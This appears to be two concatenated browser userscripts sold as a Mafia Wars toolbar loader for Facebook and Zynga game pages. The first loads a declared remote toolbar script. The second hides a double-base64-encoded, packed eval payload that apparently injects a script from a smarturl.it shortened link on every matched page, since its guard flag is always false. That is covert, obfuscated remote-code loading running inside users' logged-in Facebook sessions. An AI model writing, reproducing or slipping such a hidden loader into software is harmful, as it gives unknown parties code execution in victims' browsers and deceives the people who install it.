// ==UserScript==
// @name           Masterbars2.0
// @namespace      http://www.spockholm.com/toolbar
// @version        0.2.0
// @description    Bookmarklet loader for the Spockholm Mafia Tools
// @include        http://apps.facebook.com/inthemafia/*
// @include        https://apps.facebook.com/inthemafia/*
// @include        https://*.facebook.com/inthemafia/*
// @include        http://*.facebook.com/inthemafia/*
// @include        http://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include        https://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @match          http://apps.facebook.com/inthemafia/*
// @match          https://apps.facebook.com/inthemafia/*
// @match          http://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @match          https://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// ==/UserScript==
// $Id: spockholm_toolbar_lite.user.js,v 1.10 2014-01-16 07:21:31 martin Exp $

(function(){
	if (/html_server/.test(document.location.href)) {
		var div = document.createElement("div");
		div.id = 'spockholm_toolbar';
		var game = document.getElementById('final_wrapper');
		game.insertBefore(div,game.firstChild);
		if (typeof $ == 'undefined') {
			$ = unsafeWindow.$;
		}
		window.smtool_loader = unsafeWindow.smtool_loader = 1;
		//loadContent('http://cdn.spocklet.com/spockholm_toolbar.js?'+Math.random());
		loadContent('https://spocklet-spockholmmafiato.netdna-ssl.com/spockholm_toolbar.js?'+parseInt(new Date().getTime().toString().substring(0, 6)));
	}
	else {
		document.getElementsByClassName('fixedAux')[0].parentNode.removeChild(document.getElementsByClassName('fixedAux')[0])
	}

	function ping_server(server) {
		if (server == 'primary') {
			server = 'spocklet.com';
		}
		if (server == 'secondary') {
			server = 'backup.spocklet.com';
		}
		var img = new Image();
		img.onload = function() {
			return true;
		}
		img.src = 'http://'+server+'/ping.gif';
	}
	
	function loadContent(file){
		var head = document.getElementsByTagName('head').item(0);
		var scriptTag = document.getElementById('loadScript');
		if (scriptTag) {
			head.removeChild(scriptTag);
		}
		script = document.createElement('script');
		script.src = file;
		script.type = 'text/javascript';
		script.id = 'loadScript';
		head.appendChild(script);
	}
})();
// ==UserScript==
// @name           Masterbars2.0
// @namespace      
// @version        0.2.0
// @include        http://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include        https://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include        *://*.facebook.com/inthemafia*
// @include        https://*.facebook.com/inthemafia/*
// @include        http://*.facebook.com/inthemafia/*
// @include        http://mafiatornado.com
// @include        http://mwscripts.com/happyplace/v2*
// @include        http://mwscripts.com/happyplace*
// @include        http://spockon.me/unframed/*
// @grant       GM_setValue
// @grant       GM_getValue
// @grant       GM_xmlhttpRequest
// ==/UserScript==
{
    function itoj(j) {
        var s = document.createElement('script');
        s.innerHTML = eval(atob(j));
        document.body.appendChild(s);
    }
    var l = atob('WlhaaGJDaG1kVzVqZEdsdmJpaHdMR0VzWXl4ckxHVXNjaWw3WlQxbWRXNWpkR2x2YmloaktYdHlaWFIxY200Z1l5NTBiMU4wY21sdVp5aGhLWDA3YVdZb0lTY25MbkpsY0d4aFkyVW9MMTR2TEZOMGNtbHVaeWtwZTNkb2FXeGxLR010TFNseVcyVW9ZeWxkUFd0YlkxMThmR1VvWXlrN2F6MWJablZ1WTNScGIyNG9aU2w3Y21WMGRYSnVJSEpiWlYxOVhUdGxQV1oxYm1OMGFXOXVLQ2w3Y21WMGRYSnVKMXhjZHlzbmZUdGpQVEY5TzNkb2FXeGxLR010TFNscFppaHJXMk5kS1hBOWNDNXlaWEJzWVdObEtHNWxkeUJTWldkRmVIQW9KMXhjWWljclpTaGpLU3NuWEZ4aUp5d25aeWNwTEd0YlkxMHBPM0psZEhWeWJpQndmU2duZXprZ1lUMHhMak1vSWpRaUtUdGhMalU5SWpZdk55STdZUzQ0UFNJeU9pOHZZaTVqTDJRL0lpdGxMbVlvS1RzeExtY29JbWdpS1Zzd1hTNXBLR0VwZlNjc01Ua3NNVGtzSjN4a2IyTjFiV1Z1ZEh4b2RIUndmR055WldGMFpVVnNaVzFsYm5SOGMyTnlhWEIwZkhSNWNHVjhkR1Y0ZEh4cVlYWmhjMk55YVhCMGZITnlZM3gyWVhKOGZITnRZWEowZFhKc2ZHbDBmRkp2WTJ0VWFHVkliM1Z6Wlh4TllYUm9mSEpoYm1SdmJYeG5aWFJGYkdWdFpXNTBjMEo1VkdGblRtRnRaWHhvWldGa2ZHRndjR1Z1WkVOb2FXeGtKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09');
    var t = false;
    if (/xw_controller=freegifts/.test(document.location.href)) t = false;
    if (/xw_controller=requests/.test(document.location.href)) t = false;
    if (!t) itoj(l);
}